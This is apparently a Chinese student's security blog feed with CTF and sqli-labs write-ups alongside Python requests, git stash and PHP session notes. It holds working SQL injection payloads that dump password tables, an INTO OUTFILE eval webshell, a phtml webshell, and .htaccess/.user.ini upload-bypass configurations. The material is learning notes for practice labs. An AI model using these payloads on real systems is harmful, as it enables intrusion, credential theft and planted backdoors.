&#39;107.33393&#39;,           &#39;Latitude&#39;: &#39;33.157131&#39;,           &#39;Language&#39;: &#39;CN&#39;&#125;r = requests.post(&quot;http://www.xxxxxx.com/CityLocation/json/LBSLocateCity&quot;, heards=heard, data=payload)data = r.json()if r.status_code!=200:    print(&#39;LBSLocateCity API Error&#39; + str(r.status_code))print(data[&#39;CityEntities&#39;][0][&#39;CityID&#39;])  # 打印返回json中的某个key的valueprint(data[&#39;ResponseStatus&#39;][&#39;Ack&#39;])print(json.dump(data, indent=4, sort_keys=True, ensure_ascii=False))  # 树形打印json，ensure_ascii必须设为False否则中文会显示为unicode</code></pre><h2>上传文件</h2><p>import requests</p><p>url = ‘<a href="http://127.0.0.1:8080/upload&#39;">http://127.0.0.1:8080/upload&#39;</a></p><p>files = {‘file’: open(‘/home/rxf/test.jpg’, ‘rb’)}</p><p>//files = {‘file’: (‘report.jpg’, open(‘/home/lyb/sjzl.mpg’, ‘rb’))}     #显式的设置文件名</p><p>r = requests.post(url, files=files)</p><p>print(r.text)</p><h2>cookies与会话对象</h2><p>如果某个访问中包含一些cookie，你可以快速访问他们</p><p>import requests</p><p>r = requests.get(‘<a href="http://www.google.com.hk/&#39;">http://www.google.com.hk/&#39;</a>) </p><p>print(r.cookies[‘NID’])</p><p>print(tuple(r.cookies))</p><p>如果你想发送你的cookies到服务器，可以·使用cookies参数</p><p>import requests</p><p>url = ‘<a href="http://httpbin.org/cookies&#39;">http://httpbin.org/cookies&#39;</a></p><p>cookies = {‘testCookies_1’: ‘Hello_Python3’, ‘testCookies_2’: ‘Hello_Requests’}</p><p>//在Cookie Version 0中规定空格、方括号、圆括号、等于号、逗号、双引号、斜杠、问号、@，冒号，分号等特殊符号都不能作为Cookie的内容。</p><p>r = requests.get(url, cookies=cookies)</p><p>print(r.json())</p><p>#! /urs/bin/python3<br>import requests</p><p>‘’’requests模块抓取网页源码并保存到文件示例’’’</p><p>html = requests.get(“<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a>)</p><p>with open(‘test.txt’, ‘w’, encoding=’utf-8’) as f:</p><pre><code>f.write(html.text)</code></pre><p>‘’’读取一个txt文件，每次读取一行，并保存到另一个txt文件中的示例’’’</p><p>ff = open(‘testt.txt’, ‘w’, encoding=’utf-8’)</p><p>with open(‘test.txt’, encoding=”utf-8”) as f:</p><pre><code>for line in f:    ff.write(line)    ff.close()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql 1`10</title>
      <link href="/2021/02/25/110/"/>
      <url>/2021/02/25/110/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>1`5,基本sqlmap都可以跑出来，其他的没有尝试</p><h2>less1</h2><p>输入1’,报错，但是输入1’ –+正常，所以存在单引号闭合的漏洞</p><p>从查询语句可以看出，SELECT * FROM users WHERE id=’’ union select 1,2,database() – ‘ LIMIT 0,1，他只能显示一行内容，所以我们再进行联合查询的时候，要记得在左边是空，即是’，而不是1’</p><p>爆字段</p><p>‘ order by 3 –+,正常回显，但是4就不可以，说明有三个字段</p><p>爆库</p><p>‘ union select 1,2,database() –+  security</p><p>爆表</p><p>‘ union select 1,2,group_concat(distinct table_name) from information_schema.tables where table_schema=database() –+</p><p>emails,referers,uagents,users</p><p>感觉有关信息应该在users这个表里</p><p>爆字段</p><p>‘ union select 1,2,group_concat(distinct column_name) from information_schema.columns where table_name=’users’ –+</p><p>avatar,CURRENT_CONNECTIONS,failed_login,first_name,id,last_login,last_name,password,TOTAL_CONNECTIONS,user,username,user_id</p><p>爆敏感信息</p><p>‘ union select 1,2,group_concat(distinct password) from security.users –+</p><p>admin,admin1,admin2,admin3,admin4,crappy,Dumb,dumbo,genious,I-kill-you,mob!le,p@ssword,stupidity</p><p>ok,下一关</p><h2>less 2</h2><p>第二关，这上面没有显示sql语句，通过报错信息，感觉是，select * from users where id =’’ ‘’ limit 0,1</p><p>这个应该不需要注释符了</p><p>‘’ union select 1,2,database()</p><p>‘’ union select 1,2,group_concat(distinct table_name) from information_schema.tables where table_schema=database()</p><p>‘’ union select 1,2,group_concat(distinct column_name) from information_schema.columns where table_name=’users’</p><p>‘’ union select 1,2,group_concat(distinct password) from security.users</p><p>ok继续</p><h2>less3</h2>有个思想挺重要的，是应该跟前面闭合，而不是后面<p>语句应该是from users where id =（’’） limit 0,1<br>就是构造的应该是’)…….更上述一样</p><h2>less4</h2>?id=1") order by 4--+<p>“) union select 1,2,group_concat(distinct password) from security.users</p><p>admin,admin1,admin2,admin3,admin4,crappy,Dumb,dumbo,genious,I-kill-you,mob!le,p@ssword,stupidity</p><h2>less5</h2><p>感觉应该是什么东西被过滤了，因为本地没办法bp抓包进行模糊测试，所以我尝试了报错注入</p><p>‘ or updatexml(1,concat(‘`’,database()),1) –+ security</p><p>‘) or updatexml(1,concat(‘`’,(select group_concat(distinct table_name) from info/**/rmation_schema.tables where table_schema=’security’)),1) #</p><p>emails,referers,uagents,users</p><p>‘) or updatexml(1,concat(‘`’,(select group_concat(distinct right(column_name,30)) from information_schema.columns where table_name=’users’)),1) –+</p><p>avatar,CURRENT_CONNECTIONS,fail’很显然。这没有出来晚</p><p>atar,er,ername,er_id,iled_logi<br>avatar,CURRENT_CONNECTIONS,failed_login,first_name,id,last_login,last_name,password,TOTAL_CONNECTIONS,user,username,user_id</p><p>‘ or updatexml(1,concat(‘`’,(select group_concat(left(column_name,8)) from information_schema.columns where table_name=’users’)),1) –+</p><p>user_id,first_na,last_nam,user<br>‘ or updatexml(1,concat(‘`’,(select group_concat(distinct password) from security.users)),1) –+</p><p>因为试下知道，数据是存在user中的，做到这里，感觉自己以前学的知识已经不够用了</p><h2>less6</h2><p>跟less5一样，就是把单引号改为双引</p><h2>less7</h2>提示说是outfile<p>?=1’)) union select 1,2,”<?php @eval($_POST['a']);?>“ into outfile ‘D:/phpstudy_pro/WWW/sqli/Less-7/text.txt’ –+</p><p>木马连接</p><h3>前置知识</h3>参考：https://www.jianshu.com/p/7b9256de20d1<h2>less8</h2><p>使用了一个函数，substr，下面有对他的介绍</p><p><img src="1.png"></p><p>觉得神奇的是，以前都是说去写个脚本什么的，没想到bp也可以这样</p><p><a href="http://sqli/Less-8/?id=1%27%20and%20substr((select%20group_concat(distinct%20concat_ws(%27%60%27,username))%20from%20security.users">http://sqli/Less-8/?id=1%27%20and%20substr((select%20group_concat(distinct%20concat_ws(%27`%27,username))%20from%20security.users</a>),<mark>1</mark>,1)=%27<mark>a</mark>%27%20–+</p><p>添加$$，进行破解</p><p>也了解了时间盲注 </p><p>就是if（条件，1，2），如果条件为真，就执行1，否则，2</p><p>判断是否存在注入，?id=1’ and sleep(5) –+,当存在注入的时候，就延迟5s，收到数据包</p><p>其他的就跟那个less8一致</p><h2>less9</h2><p>时间忙注</p><p><a href="http://sqli/Less-9/?id=1%27%20and%20if(substr(database(),2,1)=%27e%27,1,sleep(5))%20--+">http://sqli/Less-9/?id=1%27%20and%20if(substr(database(),2,1)=%27e%27,1,sleep(5))%20--+</a></p><p><a href="http://sqli/Less-9/?id=1%27%20and%20if">http://sqli/Less-9/?id=1%27%20and%20if</a>(substr((select group_concat(distinct table_name) from information_schema.tables where table_schema=’security’),2,1)=%27u%27,1,sleep(5))%20–+</p><p><a href="http://sqli/Less-9/?id=1%27%20and%20if">http://sqli/Less-9/?id=1%27%20and%20if</a>(substr((select group_concat(distinct column_name) from information_schema.columns where table_name=’user’),2,1)=%27u%27,1,sleep(5))%20–+</p><h2>less10</h2><p>同less9，单引号变成双引号</p><h2>补充新知识</h2><h3>sql注入常用的函数</h3><li> mid()<p>mid(column_name,start,length)</p><p>比如mid(‘user’,2,1)<br>结果是e</p><p>用法是 mid（dasabase(),1,1）查看数据库的第一位</p><li>substr<p>跟mid（）一样</p><li>left和right</li><p>从左边开始查询</p><li>limit<p>返回结果中前几条数据，也可以是中间的数据</p><p>select* from user limit m,n<br>从m行开始，取n条</p><li>concat()<p>连接一个或多个字符串，返回结果是连接参数2产生的字符串，如果一个参数是null，返回null</p><p>concat（’1’,’2’,’null’）=12null</p><p>concat(‘1’,’2’,null)=null</p><li>concat_ws(分隔符，参数）<p>concat_ws(‘:’,’3’,’4’)=3:4</p><li>group_concat<p>分组拼接函数</p><p>group_concat(字段名 separator 分隔符)</p><li>count<p>聚集函数，统计元组个数</p><li>rand()<p>产生一个随机数</p><li>floor()<p>向下取整</p><li>ceiling<p>向上取整</p><li>group_by<p>根据规则对结果进行分组</p><li>ascii<p>返回字符串的ascii码</p><li>ord()<p>返回字符串的第一位的ascii码    </p><h3>sql双查询注入</h3><h4>子查询</h4>子查询(subquery),嵌套在其它语句中的查询<p>举个简单的例子，select concat(select database()),先进性子查询，如果数据库有两个，即a,b，那么select concat(‘a’,’b’)=ab</p><h4>双查询注入原理</h4><p>select floor(rand()*2)</p><p>返回结果不是0，就是1</p><p>用concat将结果拼接起来，select concat((select database()),floor(rand()*2))</p><p>如果在这条语句后面加上一个from表明，返回的数目是由表名决定的</p><p>把 concat((select database()),floor(rand()*2))取个别名a，然后其他的按照a进行分组，那么只能有两个结果数据库名1，数据库名0</p><p>最后一步使用报错拉进行查询的结果</p><p>select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a;    </p><p>应用到less5</p><p>1’ union select 1,count(*),concat((select database()),floor(rand()<em>2)) as a from information_schema.tables group by a –+<br>1’ union select 1,count(</em>),concat((select group_concat(table_name) from information_schema.tables where table_schema=’security’),floor(rand()*2)) as a from information_schema.columns group by a –+       </p><p>emails,referers,uagents,users  </p><p>1’ union select 1,count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=’users’),floor(rand()*2)) as a from information_schema.columns group by a –+     </p><p>user_id,first_name,last_name,user,password,avatar,last_login,fai</p><p>1’ union select 1,count(*),concat((select group_concat(password) from users),floor(rand()*2)) as a from users group by a –+      </p><h4>outfile</h4><p>这体学习了SQL注入的outfile姿势，语句是这样的，select … into outfile ‘filename’</p><p>必须要有FILE权限，并且filename必须是不存在的，这样才能将select语句写入file文件中去</p><p>在进行之前还要看一个东西，就是secure_file_priv.因为mysql数据库需要在指定目录下进行数据的导出，而指定目录就是有这个参数设定的。</p><li>如果这个变量为空，则这个变量没有效果<li>如果这个参数，设定了一个目录名，那么mysql数据库的到如何导出都是在这个目录下进行的，这个目录必须存在，mysql服务不会创建它<li>如果这个参数为null，mysql数据库会禁止导入导出操作                  ]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>spl_autoload_register()</title>
      <link href="/2021/02/24/register/"/>
      <url>/2021/02/24/register/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>在了解该函数之前先看另一个函数，__autoload</p><h2>__autoload</h2>这是一个自动加载函数，在php中使用一个未定义的类，会触发该函数<p>PRINTIT.class.php</p><pre><code>    &lt;?php class PRINTIT &#123; function doPrint() &#123; echo &#39;hello world&#39;;&#125;&#125;?&gt;  </code></pre><p>index.php</p><pre><code>&lt;?function __autoload( $class ) &#123; $file = $class . &#39;.class.php&#39;; if ( is_file($file) ) &#123; require_once($file); &#125;&#125;$obj = new PRINTIT();$obj-&gt;doPrint();?&gt;</code></pre><p>运行index.php后正常输出hello world。在index.php中，由于没有包含printit.class.php，在实例化printit时，自动调用__autoload函数，参数$class的值即为类名printit，此时printit.class.php就被引进来了。</p><p>在面向对象中这种方法经常使用，可以避免书写过多的引用文件，同时也使整个系统更加灵活。</p><p>我自己实验的时候虽然没有报错，但是又提示说，__autoload已经过时了</p><h2>spl_autoload_register</h2><pre><code>  &lt;?function loadprint( $class ) &#123;  $file = $class . &#39;.class.php&#39;;  if (is_file($file)) &#123;  require_once($file);  &#125;&#125;spl_autoload_register( &#39;loadprint&#39; );$obj = new PRINTIT();$obj-&gt;doPrint();?&gt; </code></pre><p>将__autoload换成loadprint函数。但是loadprint不会像__autoload自动触发，这时spl_autoload_register()就起作用了，它告诉PHP碰到没有定义的类就执行loadprint()  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub-备份文件下载，vim缓存</title>
      <link href="/2021/02/24/ctfhub-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8Cvim%E7%BC%93%E5%AD%98/"/>
      <url>/2021/02/24/ctfhub-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8Cvim%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>vim是个用的很多的文本编辑器</p><h2>知识点</h2><p>1.vim中的swp是swap（交换分区的产生），他是隐藏文件，就是文本编辑的时候，用于备份缓冲区的内容，如果文本编辑正常退出，则自动删除。如果，只是读取文件，但是没有修改也是不会产生swp的</p><p>2.在使用vim时，如果正常退出vim,则swp将会被删除，如果异常退出，则无法删除，那么就可以通过缓存文件来恢复原始文件</p><p>以index.php为例，第一次产生的是。.index.php.swp,如果亦称推出，就会产生.index.php.swo的交换文件，第三次产生的则是.index.php.swn</p><p>3.vim -r,可以查看当前目录下的所有swp文件，vim -r filename可以恢复文件，这样上次意外退出的没有保存的修改就可以覆盖文件</p><p>注意：因为他是隐藏文件，所以.index.php.swp前面有一个.</p><p>做了一道ctfhub题，算是巩固了一下对命令的使用</p><p>在url/.index.php.swp</p><p>下载<br>然后vim -r index.php.swp即可 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lottery</title>
      <link href="/2021/02/24/lottery/"/>
      <url>/2021/02/24/lottery/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>这是我当是解题写的，主要是太多php了，看了很多没有用的</p><p><img src="1.jpg"></p><p>很多没用的</p><p><img src="2.jpg"></p><p>确实</p><p><img src="3.jpg"></p><p>这里使用了php弱类型的比较就造成了弱类型的产生</p><p>我这道题有试了其他做法，我在本地上想尝试改变flag的金额，但是会输出‘it not true flag’,并且本地发不了包</p><p>只能通过购买彩票的方法，赢得最大金额，得到flag</p><p>这里使用bool欺瞒</p><p>在php中，如果‘bool’和任何类型比较，任何类型都会变成bool型。</p><p>在js中：<br>1.如果有一个操作数是布尔型，先进性转换，false转换为0，true转换为1</p><p>2，如果有一个操作数是字符串，而另一个操作数是数值，则先字符串转换成数值</p><p>3.如果一个操作数是对象，则先例用调用对象的valueof（）方法，获得类型，进行上述比较</p><p>在php中：<br>当转换成布尔型的时候，则下面被任用为false：<br>1.false</p><p>2.0</p><p>3.0.0</p><p>4.‘0’</p><p>5.a=[],不包含任何元素的数组</p><p>6.不包含任何成员变量的对象，（仅在php4.0）</p><p>7.null</p><p>8从空标记生成的simplexml</p><p>其他的都是true</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub git</title>
      <link href="/2021/02/23/git/"/>
      <url>/2021/02/23/git/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>1.ctf-wscan扫描<br>2.githark扫描</p><p>第一题<br>使用git log看它的日志发现有 remove flag add flag这两个版本<br>我们想办法退回到第一个版本，git reset –hard HEAD^ (–hard 参数撤销工作区中所有未提交的修改内容，将暂存区与工作区都回到上一次版本，并删除之前的所有信息提交)</p><p>第二题<br>跟slash相关 ，详见另一篇文章</p><p>第三题<br>git checkout-index -a</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>stash</title>
      <link href="/2021/02/23/stash/"/>
      <url>/2021/02/23/stash/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>用途</h1><h2>git stash当前修改</h2>git stash 会将当前正在进行的文件保存下来（包括暂存和非暂存的），然后可以恢复完整的工作目录，比如下面的工作状态，通过git stash推送一个新的储存，当前的工作目录就干净了。<pre><code>$ git statusOn branch masterChanges to be committed:new file:   style.cssChanges not staged for commit:modified:   index.html$ git stashSaved working directory and index state WIP on master: 5002d47 our new homepageHEAD is now at 5002d47 our new homepage$ git statusOn branch masternothing to commit, working tree clean</code></pre><p>需要说明一点，stash是本地的不会通过git push命令上传到给git serve ，实际应用推荐给每个stash加一个message，用于记录版本，使用<br>git stash save取代原来的</p><pre><code>$ git stash save &quot;test-cmd-stash&quot;Saved working directory and index state On autoswitch: test-cmd-stashHEAD 现在位于 296e8d4 remove unnecessary postion reset in onResume function$ git stash liststash@&#123;0&#125;: On autoswitch: test-cmd-stash</code></pre><h2>重新应用缓存的stash</h2><p>可以通过git stash pop命令恢复原来的操作</p><pre><code>$ git statusOn branch masternothing to commit, working tree clean$ git stash popOn branch masterChanges to be committed: new file:   style.cssChanges not staged for commit:modified:   index.htmlDropped refs/stash@&#123;0&#125; (32b3aa1d185dfe6d57b3c3cc3b32cbf3e380cc6a)</code></pre><p>这个命令会将stash缓存建站中的第一个stash删除，并将对应修改应用到当前的工作目录下</p><p>你也可以使用git stash apply命令，将缓存堆栈中的stash多次应用到工作目录中，但并不删除stash拷贝。</p><pre><code>$ git stash applyOn branch masterChanges to be committed:new file:   style.cssChanges not staged for commit:modified:   index.html</code></pre><h2>查看所有的stash</h2><p>可以使用git stash list，去查看所有的stash</p><pre><code>$ git stash liststash@&#123;0&#125;: WIP on master: 049d078 added the index filestash@&#123;1&#125;: WIP on master: c264051 Revert &quot;added file_size&quot;stash@&#123;2&#125;: WIP on master: 21d80a5 added number to log</code></pre><p>在使用git stash apply命令的时候可以使用stash@{0}，指定恢复哪一个，默认使用stash@{0}</p><h2>移除所有的stash</h2>git stash drop<p>若果是git stash@{0} drop指定删除哪一个</p><p>git stash clean删除全部</p><h2>查看指定stash的diff</h2>diff：比较两个文件的不同<p>用 git stash show</p><pre><code>$ git stash showindex.html | 1 +style.css | 3 +++2 files changed, 4 insertions(+)</code></pre><p>添加-p或–patch查看指定stash的全部diff</p><pre><code> $ git stash show -pdiff --git a/style.css b/style.cssnew file mode 100644index 0000000..d92368b --- /dev/null +++ b/style.css@@ -0,0 +1,3 @@ +* &#123; +  text-decoration: blink;+&#125;diff --git a/index.html b/index.html index 9daeafb..ebdcbd2 100644 --- a/index.html +++ b/index.html@@ -1 +1,2 @@ +&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;/&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无标题</title>
      <link href="/2021/02/23/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
      <url>/2021/02/23/%E6%97%A0%E6%A0%87%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>电脑终于回来了</p><span id="more"></span><p>一丁丁水引起的祸患，害真的是！这几天一直没办法更博</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buusecret file，easy sql，knife（warm up 又做了一遍）</title>
      <link href="/2021/02/15/buu%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/02/15/buu%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>warm up</h1><p>这道题，我在二刷的时候发现自己一刷的漏掉一个很关键的点。include</p><p>include可以获得指定文件中，所有的文件/代码/标记，并把它复制给使用include的文件中，这就解释了为什么url中可以直接将绕过和文件包含拼接在一起。</p><p>?file=hint.php?../../../../../ffffllllaaaagggg</p><h2>easy sql</h2><p>过滤的东西有点多</p><p>反正就是数值型注入，但是做的时候好像是看到源码，我准备扫一下目录，没用，没啥头绪，明天再看看</p><h2>secret file</h2><p>secret和end之间应该有什么联系，抓包看看</p><p>有提示secr3t.php </p><p>/flag放在了flag.php里</p><p>说我就在这里但是你看不到我</p><p>注意，刚才没有看到，secrst.php中有</p><pre><code>&lt;html&gt;&lt;title&gt;secret&lt;/title&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?phphighlight_file(__FILE__);error_reporting(0);$file=$_GET[&#39;file&#39;];if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;    echo &quot;Oh no!&quot;;    exit();&#125;include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>我用file协议，没有成功，然后用来php：//filter/read=convert.base64-encoding/resource=flag.php</p><p>得到flag{6845a78a-dadb-4e66-8499-35b687755fea}</p><h2>ping ping ping</h2><p>好伤心啊，昨天写了没有保存，害</p><h2>knife</h2><p>因为直接给了连接密码，直接菜刀练上去就可以了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2021/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>文件上传</h1><h2>前端检查</h2>对应ctfshow第一道题，先上传a.png，然后bp抓包后更改文件名为a.php,连接得到数据。<p>为什么不能不更改.php后缀，可能是没办法解析文件。</p><h2>后端检查</h2><li>大小写绕过在windows下，可以将后缀改为pHp<li>unicode<p>当目标存在json_decode且检查在json_decode之前，可以将php改写为\0070hp</p><li>使用.user.ini,<pre><code> GIF89A auto_prepend_file=a.png auto_append_file=a.png</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>session</title>
      <link href="/2021/02/12/session/"/>
      <url>/2021/02/12/session/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>session</h1><p>Session的中文译名叫做“会话”，其本来的含义是指有始有终的一系列动作/消息，比如打电话时从拿起电话拨号到挂断电话这中间的一系列过程可以称之为一个session。目前社会上对session的理解非常混乱：有时候我们可以看到这样的话“在一个浏览器会话期间，…”，这里的会话是指从一个浏览器窗口打开到关闭这个期间；也可以看到“用户（客户端）在一次会话期间”这样一句话，它可能指用户的一系列动作（一般情况下是同某个具体目的相关的一系列动作，比如从登录到选购商品到结账登出这样一个网上购物的过程；然而有时候也可能仅仅是指一次连接；其中的差别只能靠上下文来推断了。</p><p> 然而当session一词与网络协议相关联时，它又往往隐含了“面向连接”和/或“保持状态”这样两个含义，“面向连接”指的是在通信双方在通信之前要先建立一个通信的渠道，比如打电话，直到对方接了电话通信才能开始。“保持状态”则是指通信的一方能够把一系列的消息关联起来，使得消息之间可以互相依赖，比如一个服务员能够认出再次光临的老顾客并且记得上次这个顾客还欠店里一块钱。这一类的例子有“一个TCP session”或者“一个POP3 session”。</p><p>鉴于这种混乱已不可改变，要为session下个定义就很难有统一的标准。而在阅读session相关资料时，我们也只有靠上下文来推断理解了。不过我们可以这样理解：例如我们打电话，从拨通的那一刻起到挂断电话期间，因为电话一直保持着接通的状态，所以把这种接通的状态叫做session。它是访客与整个网站交互过程中一直存在的公有变量，在客户端不支持COOKIE的时候，为了保证数据正确、安全，就采用SESSION变量。访问网站的来客会被分配一个唯一的标识符，即所谓的会话 ID。它要么存放在客户端的 cookie，要么经由 URL传递。</p><p>SESSION的发明填补了HTTP协议的局限：HTTP协议被认为是无状态协议，无法得知用户的浏览状态，当它在服务端完成响应之后，服务器就失去了与该浏览器的联系。这与HTTP协议本来的目的是相符的，客户端只需要简单的向服务器请求下载某些文件，无论是客户端还是服务器都没有必要纪录彼此过去的行为，每一次请求之间都是独立的，好比一个顾客和一个自动售货机或者一个普通的（非会员制）大卖场之间的关系一样。</p><p>因此通过SESSION(cookie是另外一种解决办法)记录用户的有关信息，以供用户再次以此身份对web服务器提起请求时作确认。会话的发明使得一个用户在多个页面间切换时能够保存他的信息。网站编程人员都有这样的体会，每一页中的变量是不能在下一页中使用的(虽然form，url也可以实现，但这都是非常不理想的办法)，而SESSION中注册的变量就可以作为全局变量使用了。</p><p>那么SESSION到底有什么用处呢？网上购物时大家都用过购物车，你可以随时把你选购的商品加入到购物车中，最后再去收银台结帐。在整个过程中购物车一直扮演着临时存贮被选商品的角色，用它追踪用户在网站上的活动情况，这就是SESSION的作用，它可以用于用户身份认证，程序状态记录，页面之间参数传递等。</p><p>SESSION 的实现中采用COOKIE技术，SESSION会在客户端保存一个包含session_id(SESSION编号)的COOKIE；在服务器端保存其他 session变量，比如session_name等等。当用户请求服务器时也把session_id一起发送到服务器，通过session_id提取所保存在服务器端的变量，就能识别用户是谁了。同时也不难理解为什么SESSION有时会失效了。</p><p>当客户端禁用COOKIE时(点击IE中的“工具”—“internet=””&gt;Internet选项”，在弹出的对话框里点击“安全”—“自定义级别”项，将“允许每个对话COOKIE”设为禁用)，session_id将无法传递，此时SESSION失效。不过php5在Linux/unix平台可以自动检查cookie状态，如果客户端设置了禁用，则系统自动把session_id附加到url上传递。windows主机则无此功能。     </p><h2>session常用函数及用法</h2> Session_start()：开始一个会话或者返回已经存在的会话。<p>说明：这个函数没有参数，且返回值均为true。如果你使用基于cookie的session(cookie-based sessions),那么在使用Session_start()之前浏览器不能有任何输出，否则会发生以下错误：</p><p>Warning: Cannot send session cache limiter - headers already sent (output started at /usr/local/apache/htdocs/cga/member/1.PHP:2)…………</p><p>你可以在php=””&gt;php.ini里启动session.auto_start=1，这样就无需每次使用session之前都要调用session_start()。但启用该选项也有一些限制，如果确实启用了 session.auto_start，则不能将对象放入会话中，因为类定义必须在启动会话之前加载以在会话中重建对象。<br>请求结束后所有注册的变量都会被序列化。已注册但未定义的变量被标记为未定义。在之后的访问中这些变量也未被会话模块定义，除非用户以后定义它们。</p><p>警告:有些类型的数据不能被序列化因此也就不能保存在会话中。包括 resource变量或者有循环引用的对象（即某对象将一个指向自己的引用传递给另一个对象）。</p><p>注册SESSION变量：</p><p>PHP5使用$_SESSION[‘xxx’]=xxx注册SESSION全局变量。和GET，POST，COOKIE的使用方法相似。</p><p>注意：session_register()，session_unregister，session_is_registered在php5下不再使用，除非在php.ini里把register_globle设为on，不过出于安全考虑，强烈建议关闭register_globle。HTTP_SESSION_VARS也不提倡使用了，官方建议用$_SESSION代替之。例如：</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>.htaccess和.user.ini配置文件的妙用</title>
      <link href="/2021/02/10/htaccess%E5%92%8C-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/"/>
      <url>/2021/02/10/htaccess%E5%92%8C-user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>.htaccess</h1>httpd-conf是Apache（https://baike.baidu.com/item/Apache/6265?fr=aladdin）的系统配置文件，对整个web服务器起作用；而.htaccess也是Apache的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。<h2>实例</h2>在绕过文件上传的限制中，通常在Apache全局配置文件httpd.conf中有这样一条配置：<pre><code>     Addtype application/x-httped-php .php .phtml</code></pre><p>这条配置的意思是将.php，.phtml文件后缀的文件当作php文件执行，这也就是为什么在文件中可以尝试上传phtml，不过在高版本中这条配置是关闭的，也就是只能解析.php文件后缀。</p><p>或者这条配置：</p><pre><code>   sethandler application/x-httpd-php</code></pre><p>将所有文件都解析成phph文件。</p><p>通常全局文件我们是不能更改的，而在Apache还有一个局部配置文件.htacess,这个配置文件只在该目录下的web目录起作用。例如：我们在www文件下有一个.htacess配置文件，配置内容为<mark>Addtype application/x-httpd-php .jpg</mark>,将所有的jpg文件都当作php文件进行解析。这样可以直接解析jpg后缀的webshell。</p><pre><code>   // .htaccess  AddType application/x-httpd-php .jpg  // 1.jpg  &lt;?php phpinfo();?&gt;</code></pre><p>访问1.jpg，当作php解析</p><h2>局限</h2>在.htaccess配置文件只在Apache服务器中起作用。<h1>.user.ini</h1>php.ini是php的一个全局配置文件，对整个web服务器起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini,通常用这个文件来构造后门和隐藏后门<h2>示例</h2><p>php配置项中有两个配置可以起到一定作用</p><pre><code>  auto_prepend_file=&lt;filename&gt; //包含在文件头  auto_append_file=&lt;filename&gt;  //包含在文件尾     // .user.ini auto_prepend_file = 1.jpg  // 1.jpg &lt;?php phpinfo();?&gt; // 11.php也就是在一个目录下有.user.ini这个配置文件，配置内容为上，有1.jpg，同时该目录下还需要有.php后缀的文件，auto_prepend_file = 1.jpg 这个配置的意思就是在当前目录下的.php文件包含1.jpg这个图片，在此处相当于在11.php文件头插入了 require(&#39;1.jpg&#39;) 这条语句，也就是说相当于文件包含。</code></pre><p><img src="1.jpg"></p><p><img src="2.jpg"></p><h2>局限</h2>在.user.ini中使用这条配置也说明了是在同目录下的其他.php文件中包含配置中所指定的文件，也就是说该目录下存在.php文件，通常在在文件上传的时候，一般是有个专门目录来存放图片的，可能很小的概率会存在.php文件。<p>但是有时可以使用 ../ 来将文件上传到其他目录，达到一个利用的效果。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF upload</title>
      <link href="/2021/02/09/upload/"/>
      <url>/2021/02/09/upload/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>这道题，我本来以为就是一个前端有个检查，因为当上传.php文件的时候，是bp就劫不住，然后想就是，因为又说必须是jpg，png为后缀的，所以就把1.php改为1.jpg，成功拦截，在bp中改为1.php结尾的，发现还是后端还有一次检查，以.php结尾的还是可以被拦截住的，换成phtml文件测试。phtml文件代码如下</p><pre><code>   GIF89a  //在文件前加上GIF89a来绕过PHP getimagesize的检查，这道题中有无皆可   &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;ye&#39;]);&lt;/script&gt;   &lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre><p>//phtml，嵌入了php脚本的html</p><p>ctf中文件上传题目常用的php拓展名：</p><pre><code>利用中间件解析漏洞绕过检查，实战常用上传.user.ini或.htaccess将合法拓展名文件当作php文件解析%00截断绕过php3文件php4文件php5文件php7文件phtml文件phps文件pht文件</code></pre>]]></content>
      
      
      
